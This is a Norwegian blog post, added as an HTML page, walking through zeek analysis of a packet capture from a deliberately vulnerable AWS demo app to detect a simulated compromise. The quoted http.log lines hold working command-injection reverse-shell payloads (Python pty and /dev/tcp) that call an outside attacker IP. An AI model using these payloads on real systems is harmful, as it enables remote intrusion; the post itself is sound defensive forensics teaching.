@@ -1,0 +1,204 @@
+
+<!doctype html>
+<html lang="no">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/style.css" />
+    <title>Nettverksanalyse i skyen</title>
+  </head>
+  <body>
+    <header><nav class="navbar is-light" role="navigation" aria-label="main navigation">
+  <div class="navbar-brand">
+    <a href="/" class="navbar-item">Optkontek</a>
+    <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbarBlogg">
+      <span aria-hidden="true"></span>
+      <span aria-hidden="true"></span>
+      <span aria-hidden="true"></span>
+    </a>
+  </div>
+  
+  <div id="navbarBlogg" class="navbar-menu">
+    <div class="navbar-start">
+
+      <a href="/post" class="navbar-item">
+        Teknisk sett
+      </a>
+
+      <a href="/reise" class="navbar-item">
+        Reise
+      </a>
+
+      <a href="/preikeliste" class="navbar-item">
+        Sikkerhetsprekener
+      </a>
+
+      <a href="/om-meg" class="navbar-item">
+        Om meg
+      </a>
+
+    </div>
+  </div>
+</nav>
+</header>
+    
+<section class="page-layout">
+  <div class="container">
+        <article class="content mt-5 mx-2">
+          <h1 class="title">Nettverksanalyse i skyen</h1>
+          <p class="subtitle is-6">
+            <a href="/post">/post</a> - 
+            Offentliggjort: <time datetime="Sun Mar 05 2023 01:00:00 GMT+0100 (Central European Standard Time)">3/5/2023</time> 
+          </p>
+          <p>I denne posten tester vi nettverksbasert analyse av en skadevareinfeksjon i
+en VM som kjører på AWS. Vi antar at følgende har skjedd. En angriper har på
+mystisk vis skaffet seg tilganng til API-serveren vår kjørt diverse kommandoer der.
+Vi har kjørt en pakkedump
+av trafikken på VM-en, og bruker zeek til å analysere hva som foregår.</p>
+<p>VM-en kjører et API for å generere Chuck Norris-vitser. Denne app'en har en
+injisert sårbarhet som gir angriperen et webshell. Denne demo-app'en kan du
+finne her: <a href="https://github.com/hakdo/vulnerablenorris">github.com/hakdo/vulnerablenorris</a>. Vi bruker tcpdump for å logge nettverksaktivitet på den
+infiserte EC2-instannsen.</p>
+<h2>Nedlasting og analyse av datadump</h2>
+<p>Vi genererer datadumpen ved følgende kommando:</p>
+<pre><code>tcpdump -i eth0 -w investigation.pcap
+</code></pre>
+<p>Etterpå laster vi ned fila. Dette kan vi for eksempel bruke <code>scp</code> til,
+men jeg foretrekker å ganske enkelt kjøre en webserver og laste ned fila via
+nettleseren. Dette oppnår vi enkelt ved hjelp av Python:</p>
+<pre><code>sudo python3 -m http.server 80
+</code></pre>
+<p>Dette er selvsagt en farlig variant som kjører som root, men det er kun for
+å hente ned fila uten å endre brannmurregler (vi tillater webtrafikk).</p>
+<p>For å få mening ut av datadumpen bruker vi <a href="https://docs.zeek.org/en/current/quickstart.html#zeek-as-a-command-line-utility">zeek</a>. Vi genererer loggfiler basert
+på pcap'en.</p>
+<pre><code>2023-03-05_investigation:$ mv ~/Downloads/investigation.pcap .
+2023-03-05_investigation:$ zeek -Cr investigation.pcap 
+2023-03-05_investigation:$ ls
+conn.log		http.log		ssl.log
+dhcp.log		investigation.pcap	x509.log
+dns.log			ntp.log
+files.log		packet_filter.log
+</code></pre>
+<p>Første stopp er <code>conn.log</code>. Denne fila viser alle nettverkstilkoblingene.
+Vi skal undersøke et par antakelser om sikkerhetsbrudd her:</p>
+<ul>
+<li>Vi antar at angriperen har direkte fjerntilgang, og dermed er tilkoblet for lengre perioder i gaangen. Vi vil derfor se etter langvarige tcp-sesjoner.</li>
+<li>Vi har en mistanke om at en sårbarhet i applikasjonen er blitt utnyttet. Vi ønsker derfor å se på http-trafikken.</li>
+<li>Vi lurer på om angriperen har lastet ned flere verktøy. vi ønnsker derfor også å sjekke DNS-loggen for mistennkelige forespørsler.</li>
+</ul>
+<h3>Langvarige sesjoner</h3>
+<p>Første stopp er conn.log, og vi bruker verktøyet <code>zeek-cut</code> til å
+hente ut det vi er mest interesserte i. Følgende kommando henter ut
+de 10 tilkoblingene med lengst varighet.</p>
+<pre><code>zeek-cut -d ts id.orig_h id.orig_p id.resp_h id.resp_p service duration &lt; conn.log | sort -n -r -k 7 |head -n10
+</code></pre>
+<p>Resutlatet er som følger:</p>
+<pre><code>2023-03-05T21:26:23+0100	18.202.216.51	29442	172.31.6.55	22	-	1386.523980
+2023-03-05T21:26:29+0100	18.202.216.51	63325	172.31.6.55	22	-	1369.115168
+2023-03-05T21:37:12+0100	212.xxx.xxx.xxx	52300	172.31.6.55	3000	http	370.889356
+2023-03-05T21:38:41+0100	172.31.6.55	53000	35.217.6.162	3000	-	281.742295
+2023-03-05T21:38:43+0100	212.xxx.xxx.xxx	52310	172.31.6.55	3000	http	279.118042
+2023-03-05T21:38:44+0100	212.xxx.xxx.xxx	52311	172.31.6.55	3000	http	279.062357
+2023-03-05T21:36:03+0100	212.xxx.xxx.xxx	52297	172.31.6.55	3000	http	156.742007
+2023-03-05T21:34:13+0100	212.xxx.xxx.xxx	52290	172.31.6.55	3000	http	136.169114
+2023-03-05T21:43:39+0100	212.xxx.xxx.xxx	52350	172.31.6.55	3000	http	70.755425
+2023-03-05T21:38:50+0100	172.31.6.55	3000	212.xxx.xxx.xxx	52297	-	68.352013
+</code></pre>
+<p>Her er 172.31.6.55 VM-ens interne IP-adresse. 212.xxx... er fra meg selv. 18.202... er fra AWS
+og er min egen SSH-tilkoblinng. Den interessante her er 35.217.6.162. Denne har den interne ip-en
+som opprinnelsesadresse, og trafikken er <em>utgående</em> til 35.217.6.162, mot port 3000.</p>
+<p>Dette er uvanlig, og vi ser også at det ikke er gitt noen &quot;service&quot; for denne trafikken.</p>
+<p>Vi kan filtrere alle tilkoblinger til denne ip-adressen for å få bedre oversikt. Vi ser at vi har 4
+utgående forbindelser til denne ip-en:</p>
+<pre><code>2023-03-05_investigation:$ zeek-cut -d ts id.orig_h id.orig_p id.resp_h id.resp_p service duration &lt; conn.log | grep 35.217.6.162
+2023-03-05T21:38:41+0100	172.31.6.55	53000	35.217.6.162	3000	-	281.742295
+2023-03-05T21:43:40+0100	172.31.6.55	43778	35.217.6.162	3000	-	65.190718
+2023-03-05T21:44:57+0100	172.31.6.55	33450	35.217.6.162	3000	-	61.970277
+2023-03-05T21:47:33+0100	172.31.6.55	39858	35.217.6.162	3000	-	60.235926
+</code></pre>
+<p>Det kan være interessant å se hvor denne ip-en fører uten å kontakte den direkte. Et raskt whois-søk
+viser at dette er en IP fra Google Cloud.</p>
+<blockquote>
+<p>Denne loggen gir oss en enkel IoC - en ip-adresse. Vi kan selvsagt blokkere denne i brannmuren, men verdien er ganske begrenset siden det er veldig enkelt for angriperen å bytte til en ny IP, forutsatt at angriperen har en måte å få tilbake kontroll over serveren.</p>
+</blockquote>
+<h3>http-trafikk</h3>
+<p>La oss se om vi kan finne mer trafikk relatert til denne indikatoren i http.log. Denne loggen
+inneholder http-trafikk som ikke er kryptert. Vi kan med andre ord lese hele
+forespørselen som er sendt. Igjen er zeek-cut verktøyet vi trenger:</p>
+<pre><code>2023-03-05_investigation:$ zeek-cut -d ts id.orig_h method uri&lt; http.log | grep 35.217.6
+2023-03-05T21:37:13+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;export RHOST=&quot;35.217.6.162&quot;;export RPORT=3000;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;sh&quot;)'
+2023-03-05T21:38:45+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:42:56+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:43:39+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:44:57+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:48:39+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:49:16+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+2023-03-05T21:47:33+0100	212.xxx.xxx.xxx	GET	/dangerzone?category=fashion&amp;&amp;sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1
+</code></pre>
+<p>Her er det en del interessant! Vi ser at angriperen kommer fra IP-en 212.xxx.... (altså, min IP...). Vi ser også at dette er
+et forsøk på å sende et bash-shell til 35.217.6.162 på port 3000. Dette er altså et shell som sendes til
+angriperens maskin i Google Cloud! At det dreiser seg om et &quot;reverse shell&quot; bekreftes også av et enkelt Google-søk på
+selve angrepslasten (payload) - <code>sh -i &gt;&amp; /dev/tcp/35.217.6.162/3000 0&gt;&amp;1</code>.</p>
+<blockquote>
+<p>Denne loggen gir oss mye nyttig info til å forsvare oss. Vi har her endepunktet som tillater kommandoinjeksjon. Dette endepunktet bør vi fjerne eller oppdatere raskest mulig. Dette vil fjerne sårbarheten som angriperen utnytter, og ha veldig høy verdi for den som forsvarer denne tjenesten.</p>
+</blockquote>
+<h3>Er det alltid DNS?</h3>
+<p>Til slutt ser vi på DNS-tjeneren. DNS er nyttig på to måter her:</p>
+<ol>
+<li>Kan vi se om angriperen forsøker å laste ned flere hackerverktøy?</li>
+<li>Kan vi finne direkte tilkoblinger til IP-adresser, som ikke er knyttet til et DNS-oppslag? Dette er normalt sett mistenkelig.</li>
+</ol>
+<p>For den første, kan vi liste alla DNS-queries for domene-navnn (filtrerer bort arpa-adresser):</p>
+<pre><code>zeek-cut query &lt; dns.log |grep -v arpa|uniq
+github.com
+api.chucknorris.io
+</code></pre>
+<p>Disse to domenene er ikke særlig mistenkelige i sammenhengen. Hva så med direktetilkoblinger til IP-adresser som ikke finnes i
+DNS-responser? Da kan vi gjøre følgende:</p>
+<ol>
+<li>Finn alle tilkoblinger for utgående trafikk fra conn.log</li>
+<li>For alle ip-adresser, sjekk om det finnes en DNS-forespørsel med denne IP-en i svarfeltet</li>
+<li>Hvis det ikke finnes noen match, marker IP-adressen som mistenkelig</li>
+</ol>
+<p>Som to eksempler kan vi list alle ip-ene vi har utgående trafikk mot. Vi oppdager 104.21.41.162, og 35.217.6.162.</p>
+<p>La oss først sjekke om den første finnes i et svar på en DNS-forspørsel:</p>
+<pre><code>zeek-cut query answers &lt; dns.log|grep 140.82.121.3
+github.com	140.82.121.3
+</code></pre>
+<p>Dette er altså Github - ikke mistenkelig - mens 35.217.6.162 ikke gir noen treff i DNS.</p>
+<blockquote>
+<p>Denne typen anomalideteksjon er ganske &quot;støyete&quot; og man vil typisk ha en del trafikk som går utenom DNS, for eksempel til metadata-endepunkter for skyleverandøren. Det vil typisk også være en del trafikk til interne ip-er i samme virtuelle nettverk.</p>
+</blockquote>
+<h2>Oppsummert</h2>
+<p>Nettverksanalyser er nyttige også for skytjenester. Normalt sett vil man enten bruke en nettverksbasert IDS direkte, eller
+hente ut pakker midlertidig ved hjelp av en tjeneste i skyleverandøren. For skempel har AWS mulighet til dette for et
+VPC-nettverk, og Azure gjør det mulig å lagre pcap-filer fra en &quot;Network Watcher&quot;.</p>
+<p>Zeek er tiltenkt å bruke til sanntidsanalyser av nettverkstrafikk, hvor loggfilene som gennereres
+sendes til en SIEM, hvor man kan lage deteksjonsregler. Verktøyet er også veldig nyttig til å granske
+nettverkshendelser, og gjør relativt enkle analyser mye lettere å gjennomføre enn ved bruk av verktøy
+for mer direkte analyse av pakkedata, som Wireshark.</p>
+<p>Kort oppsummert er typisk analyseflyt:</p>
+<ol>
+<li>Sjekk conn.log for mistenkelige data. Langvarige sesjoner, IP-adresser fra uventede steder er en god start.</li>
+<li>Bruk http.log dersom det finnes ukrypterte data. Dette er fortsatt relativt vanlig for en del trusselaktører.</li>
+<li>Bruk DNS-loggen for å finne mistennkelige oppslag, og anomalier når sett opp mot conn.log.</li>
+</ol>
+
+        </article>
+      
+  </div>
+</section>
+  <hr />
+  <footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+  <a href="/personvern">Personvern.</a>
+  <a rel="me" href="https://snabelen.no/@eselet">@eselet@snabelen.no</a>
+
+    </p>
+  </div>
+</footer>
+  </body>
+  <script src="/js/navbar.js"></script>
+</html>
